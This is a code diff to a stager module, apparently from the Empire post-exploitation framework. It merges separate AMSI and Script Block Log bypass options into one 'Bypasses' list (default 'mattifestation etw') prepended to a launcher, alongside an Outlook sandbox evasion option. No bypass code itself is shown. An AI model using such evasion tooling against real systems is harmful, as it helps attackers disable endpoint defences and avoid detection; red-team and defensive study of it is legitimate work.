@@ -86,20 +86,10 @@ class Stager(object):
                 'Required'      :   False,
                 'Value'         :   'default'
             },
-            'ScriptLogBypass' : {
-                'Description'   :   'Include cobbr\'s Script Block Log Bypass in the stager code.',
-                'Required'      :   False,
-                'Value'         :   'True'
-            },
-            'AMSIBypass' : {
-                'Description'   :   'Include mattifestation\'s AMSI Bypass in the stager code.',
-                'Required'      :   False,
-                'Value'         :   'True'
-            },
-            'AMSIBypass2' : {
-                'Description'   :   'Include Tal Liberman\'s AMSI Bypass in the stager code.',
-                'Required'      :   False,
-                'Value'         :   'False'
+            'Bypasses': {
+                'Description': 'Bypasses as a space separated list to be prepended to the launcher',
+                'Required': False,
+                'Value': 'mattifestation etw'
             },
 	    'OutlookEvasion' : {
                 'Description'   :   'Include BC-Securty\'s Outlook Sandbox evasion code',
@@ -132,9 +122,7 @@ class Stager(object):
         proxyCreds = self.options['ProxyCreds']['Value']
         stagerRetries = self.options['StagerRetries']['Value']
         safeChecks = self.options['SafeChecks']['Value']
-        scriptLogBypass = self.options['ScriptLogBypass']['Value']
-        AMSIBypass = self.options['AMSIBypass']['Value']
-        AMSIBypass2 = self.options['AMSIBypass2']['Value']
+        bypasses = self.options['Bypasses']['Value']
         OutlookEvasion = self.options['OutlookEvasion']['Value']
 
         encode = False
@@ -145,24 +133,17 @@ class Stager(object):
         if obfuscate.lower() == "true":
             invokeObfuscation = True
 
-        scriptLogBypassBool = False
-        if scriptLogBypass.lower() == "true":
-            scriptLogBypassBool = True
-
-        AMSIBypassBool = False
-        if AMSIBypass.lower() == "true":
-            AMSIBypassBool = True
-
-        AMSIBypass2Bool = False
-        if AMSIBypass2.lower() == "true":
-            AMSIBypass2Bool = True
-    
         OutlookEvasionBool = False
         if OutlookEvasion.lower() == "true":
             OutlookEvasionBool = True
 
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=encode, obfuscate=invokeObfuscation, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, safeChecks=safeChecks, scriptLogBypass=scriptLogBypassBool, AMSIBypass=AMSIBypassBool, AMSIBypass2=AMSIBypass2Bool)
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=encode,
+                                                           obfuscate=invokeObfuscation, obfuscationCommand=obfuscateCommand,
+                                                           userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds,
+                                                           stagerRetries=stagerRetries, safeChecks=safeChecks,
+                                                           bypasses=bypasses)
+
         Str = ''.join(random.choice(string.ascii_letters) for i in range(random.randint(1,len(listenerName))))
         Method=''.join(random.choice(string.ascii_letters) for i in range(random.randint(1,len(listenerName))))
 
